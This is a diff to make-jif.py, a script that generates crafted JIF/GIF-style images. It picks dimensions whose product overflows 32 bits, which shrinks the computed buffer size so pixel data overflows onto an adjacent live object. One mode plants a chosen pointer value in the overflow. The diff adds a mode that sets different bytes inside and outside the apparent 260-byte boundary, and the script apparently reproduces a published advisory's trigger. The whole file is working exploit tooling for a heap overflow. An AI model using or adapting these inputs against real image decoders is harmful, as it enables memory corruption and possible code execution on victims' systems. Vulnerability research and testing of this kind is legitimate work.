@@ -9,7 +9,8 @@ and reach an adjacent live object. The `published` mode uses the advisory's
 product 45771*46918 = 0x80000082, whose alpha-doubled data_size is 260.
 
 Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
-                        published-long HEXBYTE | safe HEXBYTE)
+                        published-long HEXBYTE | published-mix IN OUT |
+                        safe HEXBYTE)
 """
 import struct
 import sys
@@ -22,10 +23,18 @@ if kind == "safe":
     plain = bytes([int(sys.argv[3], 16)]) * 16
 elif kind == "bytes":
     plain = bytes([int(sys.argv[3], 16)]) * 40
-elif kind in ("published", "published-long"):
+elif kind in ("published", "published-long", "published-mix"):
     LEN, HEIGHT = 45771, 46918
-    nbytes = 448 if kind == "published-long" else 324
-    plain = bytes([int(sys.argv[3], 16)]) * nbytes
+    nbytes = 448
+    if kind == "published-mix":
+        inside, outside = sys.argv[3], sys.argv[4]
+        plain = bytes([int(inside, 16)]) * 260 + bytes([int(outside, 16)]) * (nbytes - 260)
+    else:
+        if kind == "published-long":
+            nbytes = 448
+        else:
+            nbytes = 324
+        plain = bytes([int(sys.argv[3], 16)]) * nbytes
 elif kind == "ptr":
     chosen = struct.pack("<Q", 0x00007F0000414243)
     plain = b"\x4d" * 32 + chosen + b"\x4d" * 8
@@ -34,7 +43,7 @@ else:
 if kind in ("bytes", "ptr"):
     assert LEN * HEIGHT == 0x80000002
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
-elif kind in ("published", "published-long"):
+elif kind in ("published", "published-long", "published-mix"):
     assert LEN * HEIGHT == 0x80000082
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 260
 gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
